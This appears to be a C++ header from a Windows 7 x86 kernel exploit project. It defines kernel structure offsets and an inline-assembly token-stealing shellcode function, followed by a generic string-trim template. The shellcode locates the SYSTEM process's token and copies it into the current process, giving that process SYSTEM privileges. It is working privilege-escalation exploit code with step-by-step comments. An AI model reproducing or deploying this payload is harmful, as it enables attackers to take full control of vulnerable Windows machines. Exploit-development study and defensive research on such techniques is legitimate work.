#pragma once

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <memory>
#include <map>
#include <stdexcept>
#include <iomanip> 
#include <algorithm>
#include <type_traits>

using namespace std;


#define STR1(x) #x
#define STR(x)	STR1(x)


// Windows 7 SP1 x86, English
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID


extern "C" {
	//
	// GCC naked function being a Kernel Token stealing 
	// shellcode implementation, operating in the following manner:
	// 		1. Get the Kernel Processor Control Region current thread
	//		2. Get the _EPROCESS pointer from APC_STATE structure within _KTHREAD
	//		3. Store pointer of the current process' _EPROCESS structure
	// 		4. Search for process with system's pid = 4
	//			4a. Traverse ActiveProcessLinks.Flink pointers until you find PID=4
	//		5. Get system process' token value (_EPROCESS.Token)
	//			5a. And-out the lower token's bits to zero-out the ReferenceCounter
	//			5b. Then retrieve ReferenceCounter of current process' token
	//			5c. Then merge SYSTEM's token value with ReferenceCounter of current process' token
	//		6. Replace target process' token with that merged with system's one. 
	//		7. Restore EBP, return NTSTATUS_SUCCESS and exit cleanly.
	//
	
	static void token_stealing_win7() __attribute__ ((naked));
	static void token_stealing_win7() {
		asm (
		"	nop												\n"
		"	nop												\n"
		"	nop												\n"
		"	nop												\n"
		"	pushal											\n"
		"	xorl %eax, %eax									\n"
		"	movl %fs:" STR(KTHREAD_OFFSET) "(%eax), %eax	\n"		// Get nt!_KPCR.PcrbData.CurrentThread
		"													\n"		// _KTHREAD located at FS:[0x124]
		"	movl " STR(EPROCESS_OFFSET) "(%eax), %eax		\n"		// Get nt!_KTHREAD.ApcState.Process
		"	movl %eax, %ecx 								\n"		// Copy current process' _EPROCESS pointer
		"	movl $" STR(SYSTEM_PID) ", %edx 				\n"		// system process id
		"													\n"
		"system_pid_lookup:									\n"		// Processes traversal loop, looking for SYSTEM _EPROCESS
		"	movl " STR(FLINK_OFFSET) "(%eax), %eax			\n"		// Get nt!_EPROCESS.ActiveProcessLinks.Flink
		"	subl $" STR(FLINK_OFFSET) ", %eax 				\n"
		"	cmpl %edx, " STR(PID_OFFSET) " (%eax) 			\n" 	// Get nt!_EPROCESS.UniqueProcessId
		"	jne system_pid_lookup 							\n"
		"													\n"
		"	movl " STR(TOKEN_OFFSET) "(%eax), %edx			\n"		// Get SYSTEM process nt!_EPROCESS.Token
		"	movl " STR(TOKEN_OFFSET) "(%ecx), %edi			\n"		// Get current process nt!_EPROCESS.Token
		"													\n"
		"	andl $0xfffffff8, %edx							\n"		// apply the mask on SYSTEM process token, to remove
		"													\n"		// the reference counter on that token.
		"													\n"															
		"	andl $3, %edi									\n"		// apply the mask on current process token, to preserve
		"													\n"		// the reference counter of that token.
		"													\n"
		"	addl %edi, %edx									\n"		// merge AccessToken of SYSTEM with ReferenceCounter of
		"													\n"		// current process' token.
		"													\n"	
		"	movl %edx, " STR(TOKEN_OFFSET) "(%ecx) 			\n"		// Replace target process nt!_EPROCESS.Token
		"													\n"		// with SYSTEM process nt!_EPROCESS.Token
		"													\n"
		"	popal											\n"
		"   xor %eax, %eax									\n"		// return with NTSTATUS SUCCESS
		"	pop %ebp										\n"		// restore saved EBP
		"	ret	$8											\n"		// return cleanly
		);
	}
	
	static void token_stealing_win7_end() {}
	
}


// ===========================================
// STRUCTURES, ENUMS
//



// ===========================================
// GLOBAL VARIABLES
//



// ===========================================
// FUNCTION DECLARATIONS
//


/**
 * Metaprogrammed way of telling whether a template's type
 * is a subtype of a base template. To be used for instance
 * while telling whether passed template's type is a std::string/
 * std::wstring as it must be subtype of template std::basic_string.
**/
template <template <typename...> class Base, typename...Ts>
std::true_type is_base_of_template_implementation(const Base<Ts...>*);

template <template <typename...> class Base>
std::false_type is_base_of_template_implementation(...);

template <template <typename...> class Base, typename T>
using is_base_of_template = decltype(is_base_of_template_implementation<Base>(std::declval<T*>()));

template<typename T>
inline T trim(const T &s) {
	static_assert(
		is_base_of_template<std::basic_string, T>::value, 
		"T must inherit from std::basic_string"
	);
	
   	auto wsfront = std::find_if_not(s.begin(), s.end(), [](int c){
   		return std::isspace(c);
	});
	
   	auto wsback = std::find_if_not(s.rbegin(), s.rend(), [](int c){
	   	return std::isspace(c);
	}).base();
	
   	return (wsback <= wsfront ? T() : T(wsfront, wsback));
}

